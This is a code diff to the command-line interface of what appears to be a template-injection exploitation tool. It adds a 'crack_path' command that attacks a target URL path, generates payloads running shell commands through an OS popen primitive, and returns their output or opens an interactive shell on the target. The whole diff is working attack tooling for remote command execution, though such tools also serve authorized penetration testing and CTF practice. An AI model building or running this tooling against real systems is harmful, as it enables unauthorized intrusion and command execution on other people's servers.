@@ -4,7 +4,7 @@
 
 import logging
 from urllib.parse import urlparse
-from typing import Callable, List, Dict
+from typing import Callable, List, Dict, Union
 from functools import partial
 
 import click
@@ -12,6 +12,7 @@ import click
 
 from .form import get_form
 from .form_cracker import FormCracker
+from .path_cracker import PathCracker
 from .full_payload_gen import FullPayloadGen
 from .scan_url import yield_form
 from .requester import Requester
@@ -48,8 +49,8 @@ logger = logging.getLogger("cli")
 
 def cmd_exec(
     cmd: str,
-    cracker: FormCracker,
-    field: str,
+    cracker: Union[FormCracker, PathCracker],
+    field: Union[str, None],
     full_payload_gen: FullPayloadGen,
 ):
     """在目标上执行命令并返回回显
@@ -64,6 +65,9 @@ def cmd_exec(
         str: 回显
     """
     payload, will_print = full_payload_gen.generate(OS_POPEN_READ, cmd)
+    if payload is None:
+        logger.warning("%s generating payload.", colored("red", "Failed"))
+        return ""
     logger.info("Submit payload %s", colored("blue", payload))
     if not will_print:
         payload_wont_print = (
@@ -71,7 +75,10 @@ def cmd_exec(
             + "payload %s command execution result."
         )
         logger.warning(payload_wont_print, colored("red", "won't print"))
-    resp = cracker.submit({field: payload})
+    if isinstance(cracker, FormCracker):
+        resp = cracker.submit({field: payload})
+    else:
+        resp = cracker.submit(payload)
     assert resp is not None
     return resp.text
 
@@ -237,6 +244,61 @@ def crack(
         cmd_exec,
         cracker=cracker,
         field=field,
+        full_payload_gen=full_payload_gen,
+    )
+    if exec_cmd == "":
+        interact(cmd_exec_func)
+    else:
+        print(cmd_exec_func(exec_cmd))
+    logger.warning("Bye!")
+
+
+@main.command()
+@click.option("--url", "-u", help="需要攻击的URL")
+@click.option(
+    "--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则成功后进入交互模式"
+)
+@click.option("--interval", default=0.0, help="每次请求的间隔")
+@click.option(
+    "--detect-mode", default=DETECT_MODE_ACCURATE, help="分析模式，可为accurate或fast"
+)
+@click.option(
+    "--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent"
+)
+@click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
+@click.option("--cookies", default="", help="请求时使用的Cookie")
+def crack_path(
+    url: str,
+    exec_cmd: str,
+    interval: float,
+    detect_mode: str,
+    user_agent: str,
+    header: tuple,
+    cookies: str,
+):
+    """
+    攻击指定的路径
+    """
+    assert url is not None, "Please provide URL!"
+    print(TITLE)
+    requester = Requester(
+        interval=interval,
+        user_agent=user_agent,
+        headers=parse_headers_cookies(
+            headers_list=list(header), cookies=cookies
+        ),
+    )
+    cracker = PathCracker(
+        url=url, requester=requester, detect_mode=detect_mode
+    )
+    full_payload_gen = cracker.crack()
+    if full_payload_gen is None:
+        logger.warning("Test form failed...")
+        return
+    cmd_exec_func = partial(
+        cmd_exec,
+        cracker=cracker,
+        field=None,
         full_payload_gen=full_payload_gen,
     )
     if exec_cmd == "":
